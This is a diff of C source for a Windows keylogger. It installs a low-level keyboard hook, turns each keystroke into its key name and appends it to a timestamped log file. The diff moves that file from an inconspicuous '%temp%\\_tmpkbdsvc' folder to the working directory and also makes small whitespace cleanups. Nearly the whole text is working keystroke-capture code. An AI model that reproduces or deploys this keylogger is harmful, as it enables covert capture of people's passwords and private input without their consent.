@@ -64,26 +64,21 @@ __declspec(dllexport) LRESULT CALLBACK KeyEvent (
         //fix right shift
         if (hooked.vkCode != VK_RSHIFT)
             dwMsg += ((hooked.flags & LLKHF_EXTENDED) << 24);
-        //dwMsg += hooked.scanCode << 16; 
-        //dwMsg += hooked.flags << 24; 
     //  Call the GetKeyNameText() function to get the language-dependant 
     //  name of the pressed key. This function should return the name 
     //  of the pressed key in your language, aka the language used on 
     //  the system. 
         char lpszName[0x100] = {0}; 
-        //lpszName[0] = '['; 
         int i = GetKeyNameText(dwMsg, (lpszName), 0xFF); 
         lpszName[i] = '|'; 
     //  Print this name to the standard console output device. 
         FILE *file;  
         char fn[1024];
         char ftime[80];
-        char envar[1024];
         get_ftime(ftime);
-        ExpandEnvironmentStrings("%temp%", envar, 1024);
-        sprintf(fn, "%s\\_tmpkbdsvc\\%s.k", envar, ftime);        
-        file=fopen(fn,"a+"); 
-        fputs(lpszName,file);
+        sprintf(fn, "_%s.k", ftime);         
+        file=fopen(fn, "a+"); 
+        fputs(lpszName, file);
         fflush(file);
         fclose(file);
     } 
@@ -132,6 +127,7 @@ DWORD WINAPI KeyLogger(LPVOID lpParameter)
 //  added a signal handler for ctrl-c that unhooks 
 //  the hook once the application is terminated by 
 //  the user, but I was too lazy. 
+
     MsgLoop(); 
     UnhookWindowsHookEx(hKeyHook); 
     return 0; 
@@ -148,10 +144,11 @@ int main(int argc, char** argv)
     HANDLE hThread; 
     DWORD dwThread; 
     DWORD exThread; 
+    
     hThread = CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE) 
         KeyLogger, (LPVOID) argv[0], NULL, &dwThread); 
     if (hThread) { 
-        return WaitForSingleObject(hThread,INFINITE); 
+        return WaitForSingleObject(hThread, INFINITE); 
     } else { 
         return 1; 
     } 
